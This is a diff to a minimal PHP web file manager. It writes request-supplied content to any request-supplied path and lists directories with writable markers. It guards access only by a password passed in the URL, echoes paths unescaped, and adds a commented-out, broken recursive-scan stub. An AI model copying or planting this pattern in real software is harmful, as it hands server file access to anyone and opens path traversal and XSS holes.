@@ -10,6 +10,18 @@ $path = $_REQUEST['path'] ?? '.';
 if (is_dir($path) == false && isset($_POST['content'])) {
   file_put_contents($path, html_entity_decode($_POST['content']));
 }
+
+// https://stackoverflow.com/a/21073572/925196
+
+function scandir_r($dir = '.') {
+/*    $scan = array_diff(scandir($dir), array('.', '..');
+    $tree = array();
+    $queue = array();
+    foreach ( $scan as $item ) 
+        if ( is_file($item) ) $queue[] = $item;
+        else $tree[] = scanRecursively($dir . '/' . $item);
+    return array_merge($tree, $queue);*/
+}
 ?>
 <!DOCTYPE html>
 <html>
@@ -20,11 +32,15 @@ if (is_dir($path) == false && isset($_POST['content'])) {
 <?php
   if (is_dir($path)):
     $files = array_diff(scandir($path), ['.']); ?>
-    <ul>
-    <?php foreach ($files as $file): ?>
-    <li><a href="?path=<?= $path.'/'.$file ?>&pass=<?= $_GET['pass'] ?>"><?= $file ?></a></li>
+    <table border="0" cellspacing="0" cellpadding="5">
+    <?php $count = 0; foreach ($files as $file): ?>
+    <tr <?= $count++ % 2 ? 'bgcolor="lightgray"' : '' ?> >
+<td><?= is_dir($path . '/' . $file) ? '📁' : '📄' ?></td>
+<td><a href="?path=<?= $path.'/'.$file ?>&pass=<?= $_GET['pass'] ?>"><?= $file ?></a></td>
+<td><?= is_writable($path .'/'.$file) ? '✍ writable' : '🔒 not writable' ?></td>
+</tr>
    <?php endforeach; ?>
-    </ul>
+    </table>
 <?php else: ?>
 <form method="POST">
 <input type="hidden" name="path" value="<?= $path ?>">
